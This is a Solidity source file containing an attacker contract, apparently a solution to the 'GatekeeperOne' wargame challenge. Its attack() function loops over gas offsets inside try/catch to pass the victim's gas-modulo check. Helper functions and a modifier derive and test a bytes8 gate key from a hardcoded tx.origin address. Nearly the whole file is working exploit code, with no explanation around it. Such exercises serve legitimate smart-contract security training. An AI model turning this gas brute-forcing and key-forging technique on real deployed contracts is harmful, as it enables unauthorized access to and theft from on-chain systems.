// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperOneEnter{
    function enter(bytes8 _gateKey) external returns (bool) ;
}
contract GatekeeperOneAttacker{
    event Success(uint256 i);
    event Failed(string s);
    address public victimContratAddr;
    constructor(address _victimContractAddr){
        victimContratAddr = _victimContractAddr;
    }

    function attack(bytes8 gateKey) external{
        for (uint256 i = 0; i < 500; i++) {
            try  IGatekeeperOneEnter(victimContratAddr).enter{gas: i + 8191 * 3}(gateKey) {
                // success enter
                emit Success(i); // log when success
                break;
            } catch {
                continue;
            }
        }
    }
    
    function attackOriginal(bytes8 gateKey,uint256 addGas) external{
        IGatekeeperOneEnter(victimContratAddr).enter{gas:  addGas+ 8191 * 3}(gateKey);
    }

   function getGateKey(bytes8 _gateKey) external pure returns (uint160){
       address txOrigin = 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4;//for test
        
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(txOrigin)), "GatekeeperOne: invalid gateThree part three");

        //uint32(uint64(_gateKey)) = uint16(uint64(_gateKey)) = uint16(uint160(txOrigin));

        //need to find an hexcaliam can satify the statement above
        //0x000000010000xxxx
       return (uint160(txOrigin));
    }


    modifier gateThree(bytes8 _gateKey) {
        address txOrigin = 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4;
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(txOrigin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }
    function testModifier(bytes8 _gateKey)external  pure  gateThree(_gateKey) returns (uint256){
        return 1000;
    }

}